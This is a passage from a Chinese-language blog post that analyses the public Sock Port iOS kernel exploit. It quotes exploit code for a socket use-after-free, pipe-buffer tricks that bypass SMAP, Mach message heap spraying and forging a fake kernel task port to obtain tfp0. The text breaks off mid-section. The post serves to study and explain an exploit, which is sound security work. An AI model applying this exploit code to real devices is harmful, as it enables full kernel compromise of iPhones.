<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=" Sock Port 漏洞解析（四）The tfp0 !"><meta name="keywords" content="Sock Port,UAF,tfp0"><meta name="author" content="高级页面仔 (Soulghost)"><meta name="copyright" content="高级页面仔 (Soulghost)"><title> Sock Port 漏洞解析（四）The tfp0 ! | iOS Security Cabin</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#准备工作"><span class="toc-number">2.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#步骤分解"><span class="toc-number">3.</span> <span class="toc-text">步骤分解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMAP-与-Pipe-Buffer"><span class="toc-number">4.</span> <span class="toc-text">SMAP 与 Pipe Buffer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Supervisor-Mode-Access-Prevention"><span class="toc-number">4.1.</span> <span class="toc-text">Supervisor Mode Access Prevention</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pipe-IO-System-Call"><span class="toc-number">4.2.</span> <span class="toc-text">Pipe IO System Call</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取-Pipe-Buffer-Address"><span class="toc-number">4.3.</span> <span class="toc-text">获取 Pipe Buffer Address</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pipe-Buffer-UAF"><span class="toc-number">5.</span> <span class="toc-text">Pipe Buffer UAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Socket-UAF-Free-Primitive"><span class="toc-number">5.1.</span> <span class="toc-text">Socket UAF Free Primitive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Free-the-Pipe-Buffer"><span class="toc-number">5.2.</span> <span class="toc-text">Free the Pipe Buffer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mach-OOL-Message-Spraying"><span class="toc-number">6.</span> <span class="toc-text">Mach OOL Message Spraying</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#伪造-port-与-task"><span class="toc-number">7.</span> <span class="toc-text">伪造 port 与 task</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#另一个-pipe"><span class="toc-number">7.1.</span> <span class="toc-text">另一个 pipe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#偷梁换柱"><span class="toc-number">7.2.</span> <span class="toc-text">偷梁换柱</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#接收-Mach-OOL-Message"><span class="toc-number">8.</span> <span class="toc-text">接收 Mach OOL Message</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pid-for-task-Kernel-Read-Primitive"><span class="toc-number">9.</span> <span class="toc-text">pid_for_task Kernel Read Primitive</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#获取-kernel-vm-map"><span class="toc-number">10.</span> <span class="toc-text">获取 kernel vm_map</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#第一个-tfp0"><span class="toc-number">11.</span> <span class="toc-text">第一个 tfp0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#稳定的-tfp0"><span class="toc-number">12.</span> <span class="toc-text">稳定的 tfp0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#环境清理"><span class="toc-number">13.</span> <span class="toc-text">环境清理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">14.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#下节预告"><span class="toc-number">15.</span> <span class="toc-text">下节预告</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">16.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://avatars0.githubusercontent.com/u/6300263?s=460&amp;u=c55866a279854c9150528b358802a75be5e6a507&amp;v=4"></div><div class="author-info__name text-center">高级页面仔 (Soulghost)</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Soulghost" target="_blank" rel="noopener">Follow Me on GitHub</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">10</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">19</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">iOS Security Cabin</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title"> Sock Port 漏洞解析（四）The tfp0 !</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-08</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过前 3 篇文章我们已经掌握了通过 Sock Port 达到 tfp0 所需要的 Primitives，本文将带大家分析 Sock Port 利用上述 Primitives 实现 tfp0 的过程。</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>本文只会对关键代码进行讲解，请大家自行打开 <a href="https://github.com/jakeajames/sock_port/tree/sock_port_2" target="_blank" rel="noopener">Sock Port 2</a> 中的 <code>exploit.c</code>，从 <code>get_tfp0</code> 函数入手结合本文进行分析。</p>
<h1 id="步骤分解"><a href="#步骤分解" class="headerlink" title="步骤分解"></a>步骤分解</h1><p>首先我们将整个获得 tfp0 的步骤分解，给大家一个整体的认识。</p>
<ol>
<li>泄露进程自己的 <code>self_port_address</code>，进而获取以下内容；<ul>
<li><code>self_task_addresss</code></li>
<li><code>ipc_space_kernel</code></li>
</ul>
</li>
<li>使用 pipe 函数分配一对进程通信管道句柄 <code>fds</code>，通过 <code>self_task_addresss</code> 包含的进程信息 <code>proc</code> 可以查询到 <code>fds</code> 句柄在内核中所分配缓冲区的实际地址 <code>pipe_buffer_address</code>；<ul>
<li>使用 pipe 可以分配出一对在进程之间读写的文件描述符，在读写的同时会在内核中分配相应的缓冲区</li>
</ul>
</li>
<li>使用上一篇文章中提到的 IOSurface Spraying 结合 Socket UAF 可以实现将 <code>pipe_buffer_address</code> 对应的内容释放，从而得到一个已释放的 <code>pipe_buffer</code>；</li>
<li>创建一个有 send right 的 <code>mach port</code>，使用 OOL Message Spraying 将其填充到已释放的 <code>pipe_buffer</code>；</li>
<li>此时内核会认为 <code>pipe_buffer</code> 中的都是合法 port，随后我们伪造一个 <code>fake port</code> 和对应的 <code>fake task</code>，然后将 <code>fake_port_address</code> 替换到 <code>pipe_buffer</code> 的前 8 个字节，这样我们就拿到了一个具有 send right 的 <code>ipc_port</code> 和 <code>task</code> 的控制权；</li>
<li>接收之前的 OOL Message，我们会重新拿到执行 OOL Message Spraying 时使用的 ports，但 ports[0] 已经被篡改为我们的 <code>fake_port</code>，我们对其有完整的控制能力；</li>
<li>通过操纵 <code>fake_port</code>，我们能够获得一个更加稳定的 Kernel Read Primitive，此后借助它枚举出内核进程，然后拿到内核的 <code>vm_map</code>；</li>
<li>将内核的 <code>vm_map</code> 赋予 <code>fake port</code>，此时我们的 <code>fake port</code> 已经是一个完备的 kernel task port，tfp0 初步成立；</li>
<li>用这个 tfp0 去创建一个更稳定的 tfp0，然后清理腐化的环境，消除后续的 Kernel Panic 隐患。</li>
</ol>
<p>下面将详细讲解这些步骤中在前序文章中未提及的内容。</p>
<h1 id="SMAP-与-Pipe-Buffer"><a href="#SMAP-与-Pipe-Buffer" class="headerlink" title="SMAP 与 Pipe Buffer"></a>SMAP 与 Pipe Buffer</h1><h2 id="Supervisor-Mode-Access-Prevention"><a href="#Supervisor-Mode-Access-Prevention" class="headerlink" title="Supervisor Mode Access Prevention"></a>Supervisor Mode Access Prevention</h2><p>PageSize 为 16KB 的 iPhone 7 及以上设备包含了被称之为 SMAP(Supervisor Mode Access Prevention) 的缓解措施，通过这项措施能够阻止内核直接访问 userland 内存，为二进制漏洞利用带来了一些限制。</p>
<p>根据 Wikipedia 上对 SMAP 的描述[1]：</p>
<blockquote>
<p>Supervisor Mode Access Prevention (SMAP) is a feature of some CPU implementations such as the Intel Broadwell microarchitecture that allows supervisor mode programs to optionally set user-space memory mappings so that access to those mappings from supervisor mode will cause a trap. This makes it harder for malicious programs to “trick” the kernel into using instructions or data from a user-space program.</p>
</blockquote>
<p>即 SMAP 使得处于 Supervisor Mode 的程序（例如 Kernel）在访问用户空间内存时会触发异常，这使得我们在用户态 fake 的数据不能直接被内核访问。为了绕过这一限制，我们必须设法在内核中分配可控的区域。</p>
<h2 id="Pipe-IO-System-Call"><a href="#Pipe-IO-System-Call" class="headerlink" title="Pipe IO System Call"></a>Pipe IO System Call</h2><p>幸运的是操作系统提供了 Pipe IO System Call，根据 GeeksforGeeks 上对 Pipe 的描述[2]：</p>
<blockquote>
<p>Conceptually, a pipe is a connection between two processes, such that the standard output from one process becomes the standard input of the other process. In UNIX Operating System, Pipes are useful for communication between related processes(inter-process communication).</p>
</blockquote>
<p>即 pipe 是两个进程间通信的管道，一个进程的标准输出将作为另一个进程的标准输入。使用 pipe 函数可以得到一对读写句柄 fds，如下图所示（图片来自 GeeksforGeeks）：</p>
<p><img src="https://user-gold-cdn.xitu.io/2019/12/8/16ee467a2c9f3e84?w=392&h=239&f=png&s=27026" alt="图片来自 GeeksforGeeks"></p>
<p>使用 pipe 读写时，由于要实现跨进程共享内存，缓冲区会被分配到内核中，在用户态拿到的是 fd 句柄，而 fd 对应的缓冲区地址被记录在了任务端口上，基于已泄露的 <code>task port</code> 和前序文章中提到的 Kernel Read Primitive 即可拿到内核中的缓冲区地址。此时我们已经间接获得了一块内核中的可控区域，关键代码如下（省略了错误检查）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// here we'll create a pair of pipes (4 file descriptors in total)</span></span><br><span class="line"><span class="comment">// first pipe, used to overwrite a port pointer in a mach message</span></span><br><span class="line"><span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">ret = pipe(fds);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] failed to create pipe\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// make the buffer of the first pipe 0x10000 bytes (this could be other sizes, but know that kernel does some calculations on how big this gets, i.e. when I made the buffer 20 bytes, it'd still go to kalloc.512</span></span><br><span class="line"><span class="keyword">uint8_t</span> pipebuf[<span class="number">0x10000</span>];</span><br><span class="line"><span class="built_in">memset</span>(pipebuf, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">write</span>(fds[<span class="number">1</span>], pipebuf, <span class="number">0x10000</span>); <span class="comment">// do write() to allocate the buffer on the kernel</span></span><br><span class="line"><span class="built_in">read</span>(fds[<span class="number">0</span>], pipebuf, <span class="number">0x10000</span>); <span class="comment">// do read() to reset buffer position</span></span><br><span class="line"><span class="built_in">write</span>(fds[<span class="number">1</span>], pipebuf, <span class="number">8</span>); <span class="comment">// write 8 bytes so later we can read the first 8 bytes (used to verify if spraying worked)</span></span><br></pre></td></tr></table></figure>

<p>上述代码在内核中创建了一个大小为 64K 的缓冲区，需要注意的是 fd 的读写平衡，每次 write 操作都会将 cursor 向后移动，每次 read 操作都将把 cursor 向前移动。这里先通过一次平衡的读写在内核中创建了缓冲区，随后写入 8 字节，这是为了方便之后从中读回第一个 port，即我们的 fake port。</p>
<h2 id="获取-Pipe-Buffer-Address"><a href="#获取-Pipe-Buffer-Address" class="headerlink" title="获取 Pipe Buffer Address"></a>获取 Pipe Buffer Address</h2><p>基于 <code>task port</code> 和 fd 句柄很容易就能拿到 pipe buffer 的地址，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">self_port_addr = task_self_addr(); <span class="comment">// port leak primitive</span></span><br><span class="line"><span class="keyword">uint64_t</span> task = rk64_check(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));</span><br><span class="line">self_task_addr = task;</span><br><span class="line"><span class="keyword">uint64_t</span> proc = rk64_check(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));</span><br><span class="line">self_proc_addr = proc;</span><br><span class="line"><span class="keyword">uint64_t</span> p_fd = rk64_check(proc + koffset(KSTRUCT_OFFSET_PROC_P_FD));</span><br><span class="line"><span class="keyword">uint64_t</span> fd_ofiles = rk64_check(p_fd + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> fproc = rk64_check(fd_ofiles + fds[<span class="number">0</span>] * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">uint64_t</span> f_fglob = rk64_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));</span><br><span class="line"><span class="keyword">uint64_t</span> fg_data = rk64_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));</span><br><span class="line"><span class="keyword">uint64_t</span> pipe_buffer = rk64_check(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] pipe buffer: 0x%llx\n"</span>, pipe_buffer);</span><br></pre></td></tr></table></figure>

<h1 id="Pipe-Buffer-UAF"><a href="#Pipe-Buffer-UAF" class="headerlink" title="Pipe Buffer UAF"></a>Pipe Buffer UAF</h1><p>我们的最终目的是控制一个 port，因此需要系统将 port 分配到我们的可控区域，即 pipe buffer 中，这样我们就能对其进行完全控制。这里我们将利用 Socket UAF 释放 Pipe Buffer，再利用 Mach OOL Message Spraying 将有效的 port 填充过来。</p>
<h2 id="Socket-UAF-Free-Primitive"><a href="#Socket-UAF-Free-Primitive" class="headerlink" title="Socket UAF Free Primitive"></a>Socket UAF Free Primitive</h2><p>在前序文章中我们讲了利用 Socket UAF 实现的 Kernel Read，其实它还可以实现任意内核 Zone 的释放逻辑，这里的利用方式与之前提到的 Kernel Read 基本相同，也是把待处理的地址存储到 <code>fake options</code> 中的 <code>ip6po_pktinfo</code> 字段。区别在于 Spraying 成功后，我们不读取内容，而是给 <code>ip6po_pktinfo</code> 写一个全 0 的结构，这会导致 <code>ip6po_pktinfo</code> 指向的内容被释放。</p>
<p>按照常规的理解，释放 <code>ip6po_pktinfo</code> 指向的区域时，释放的区域长度应当以 <code>ip6po_pktinfo</code> 长度为准，但由内核中的代码得知这里使用了 FREE 函数，自动根据 zone 头部的 size 决定释放的长度，即以 <code>ip6po_pktinfo</code> 指向的区域为准，这就导致了一个任意长度区域释放的 Primitive，内核中的关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ip6_clearpktopts</span><span class="params">(struct ip6_pktopts *pktopt, <span class="keyword">int</span> optname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pktopt == <span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (optname == <span class="number">-1</span> || optname == IPV6_PKTINFO) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (pktopt-&gt;ip6po_pktinfo)</span><br><span class="line">    		FREE(pktopt-&gt;ip6po_pktinfo, M_IP6OPT); <span class="comment">// &lt;-- free</span></span><br><span class="line">    	pktopt-&gt;ip6po_pktinfo = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>它是对 <code>kfree_addr</code> 的封装，而 <code>kfree_addr</code> 中有基于地址获取到 zone 及 size 的逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">vm_size_t</span> <span class="title">kfree_addr</span><span class="params">(<span class="keyword">void</span> *addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">vm_map_t</span> <span class="built_in">map</span>;</span><br><span class="line">    <span class="keyword">vm_size_t</span> <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">kern_return_t</span> ret;</span><br><span class="line">    <span class="keyword">zone_t</span> z;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">size</span> = zone_element_size(addr, &amp;z); <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span>) &#123;</span><br><span class="line">    	DTRACE_VM3(kfree, <span class="keyword">vm_size_t</span>, <span class="number">-1</span>, <span class="keyword">vm_size_t</span>, z-&gt;elem_size, <span class="keyword">void</span>*, addr);</span><br><span class="line">    	zfree(z, addr);</span><br><span class="line">    	<span class="keyword">return</span> <span class="built_in">size</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h2 id="Free-the-Pipe-Buffer"><a href="#Free-the-Pipe-Buffer" class="headerlink" title="Free the Pipe Buffer"></a>Free the Pipe Buffer</h2><p>利用上面的 Primitive，我们能够轻易地释放 Pipe Buffer：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// free the first pipe buffer</span></span><br><span class="line">ret = free_via_uaf(pipe_buffer);</span><br></pre></td></tr></table></figure>
<p>此时我们已经达成了 Pipe Buffer UAF。</p>
<h1 id="Mach-OOL-Message-Spraying"><a href="#Mach-OOL-Message-Spraying" class="headerlink" title="Mach OOL Message Spraying"></a>Mach OOL Message Spraying</h1><p>为了获得合法、可控的 <code>ipc_port</code>，我们使用 Mach OOL Message 进行 Heap Spraying，这里注意记录下 <code>remote port</code>，因为后续我们需要接收消息拿到被我们替换 port 的句柄：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a new port, this one we'll use for tfp0</span></span><br><span class="line"><span class="keyword">mach_port_t</span> target = new_port();</span><br><span class="line"><span class="comment">// reallocate it while filling it with a mach message containing send rights to our target port</span></span><br><span class="line"><span class="keyword">mach_port_t</span> p = MACH_PORT_NULL;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// pipe is 0x10000 bytes so make 0x10000/8 pointers and save result as we'll use later</span></span><br><span class="line">    p = fill_kalloc_with_port_pointer(target, <span class="number">0x10000</span>/<span class="number">8</span>, MACH_MSG_TYPE_COPY_SEND);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// check if spraying worked by reading first 8 bytes</span></span><br><span class="line">    <span class="keyword">uint64_t</span> addr;</span><br><span class="line">    <span class="built_in">read</span>(fds[<span class="number">0</span>], &amp;addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr == target_addr) &#123; <span class="comment">// if we see the address of our port, it worked</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">write</span>(fds[<span class="number">1</span>], &amp;addr, <span class="number">8</span>); <span class="comment">// reset buffer position</span></span><br><span class="line">    </span><br><span class="line">    mach_port_destroy(mach_task_self(), p); <span class="comment">// spraying didn't work, so free port</span></span><br><span class="line">    p = MACH_PORT_NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们使用了与 Pipe Buffer 尺寸相同（0x10000）的消息，以便能够成功的将 port address 填充到 Pipe Buffer 中。</p>
<p>如何检查我们是否成功呢？只需要先拿到上述 target port 的地址，再从 Pipe Buffer 中读取 8B（由于之前我们预写了 8B，这里拿到的应该是第一个 port 的地址），如果 Spraying 成功 target port address 应当等于我们从 Pipe Buffer 中读到的地址。</p>
<h1 id="伪造-port-与-task"><a href="#伪造-port-与-task" class="headerlink" title="伪造 port 与 task"></a>伪造 port 与 task</h1><h2 id="另一个-pipe"><a href="#另一个-pipe" class="headerlink" title="另一个 pipe"></a>另一个 pipe</h2><p>上述填充到 Pipe Buffer 中的依然是用户态 port，并没有 tfp0 能力，我们需要篡改这个 port 以获得 tfp0。</p>
<p>由于 SMAP 的存在，我们的 fake port 与 fake task 都需要通过 pipe 拷贝到内核中才能被正常访问，因此我们需要再创建一个 pipe。</p>
<p>Sock Port 源码中这个部分十分巧妙，它在内核中分配了能容纳 port 与 task 的连续区域，然后让 port-&gt;task 指向与之相邻的 task 区域，这样我们就用一片区域同时控制了 port 与 task，又绕过了 SMAP，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> port_fds[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">pipe(port_fds);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create fake port and fake task, put fake_task right after fakeport</span></span><br><span class="line"><span class="keyword">kport_t</span> *fakeport = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line"><span class="keyword">ktask_t</span> *fake_task = (<span class="keyword">ktask_t</span> *)((<span class="keyword">uint64_t</span>)fakeport + <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>));</span><br><span class="line">bzero((<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line"></span><br><span class="line">fake_task-&gt;ref_count = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">fakeport-&gt;ip_bits = IO_BITS_ACTIVE | IKOT_TASK;</span><br><span class="line">fakeport-&gt;ip_references = <span class="number">0xd00d</span>;</span><br><span class="line">fakeport-&gt;ip_lock.type = <span class="number">0x11</span>;</span><br><span class="line">fakeport-&gt;ip_messages.port.receiver_name = <span class="number">1</span>;</span><br><span class="line">fakeport-&gt;ip_messages.port.msgcount = <span class="number">0</span>;</span><br><span class="line">fakeport-&gt;ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;</span><br><span class="line">fakeport-&gt;ip_messages.port.waitq.flags = mach_port_waitq_flags();</span><br><span class="line">fakeport-&gt;ip_srights = <span class="number">99</span>;</span><br><span class="line">fakeport-&gt;ip_kobject = <span class="number">0</span>;</span><br><span class="line">fakeport-&gt;ip_receiver = ipc_space_kernel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SMAP) &#123;</span><br><span class="line">    <span class="built_in">write</span>(port_fds[<span class="number">1</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line">    <span class="built_in">read</span>(port_fds[<span class="number">0</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里省略了获得 port_pipe_buffer 地址的代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SMAP) &#123;</span><br><span class="line">    <span class="comment">// align ip_kobject at our fake task, so the address of fake port + sizeof(kport_t)</span></span><br><span class="line">    fakeport-&gt;ip_kobject = port_pipe_buffer + <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    fakeport-&gt;ip_kobject = (<span class="keyword">uint64_t</span>)fake_task;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 SMAP 下，内核中引用的地址不能来自 userland，因此上述关键代码底部的 task 指向的是 Pipe Buffer 中的空间。</p>
<h2 id="偷梁换柱"><a href="#偷梁换柱" class="headerlink" title="偷梁换柱"></a>偷梁换柱</h2><p>接下来我们用 fake port 去替换 Pipe Buffer 中的第一个合法 port：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SMAP) &#123;</span><br><span class="line">    <span class="comment">// spraying worked, now the pipe buffer is filled with pointers to our target port</span></span><br><span class="line">    <span class="comment">// overwrite the first pointer with our second pipe buffer, which contains the fake port</span></span><br><span class="line">    <span class="built_in">write</span>(fds[<span class="number">1</span>], &amp;port_pipe_buffer, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">write</span>(fds[<span class="number">1</span>], &amp;fakeport, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样注意，在 SMAP 模式下应当写入 <code>port_pipe_buffer</code> 的地址而不是 userland 的 fakeport 地址。此时我们已经将 fakeport 放到了合法的 port 区域，换句话说我们完全控制了一个 <code>ipc_port</code>。</p>
<h1 id="接收-Mach-OOL-Message"><a href="#接收-Mach-OOL-Message" class="headerlink" title="接收 Mach OOL Message"></a>接收 Mach OOL Message</h1><p>由于 port 句柄包含了 rights 信息，我们的篡改会改变 Pipe Buffer 中第一个 port 的句柄，因此我们需要接收 OOL Message 来重新读到这个句柄，还记得之前记录下的 remote port 吗，我们可以通过它接收发送的 OOL Message：</p>
